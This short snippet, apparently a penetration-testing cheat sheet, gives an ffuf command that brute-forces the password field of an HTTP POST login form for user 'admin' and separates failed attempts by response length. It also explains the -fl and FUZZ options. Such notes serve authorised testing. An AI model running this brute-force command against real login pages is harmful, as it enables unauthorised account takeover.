HTTP-POST form bruteforce based on length like this:

```
ffuf -w /path/to/wordlist.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fl 480
```

-fl: tells it to filter out the length you don't want (failed attempt) FUZZ: is where it will replace words from the wordlist in the request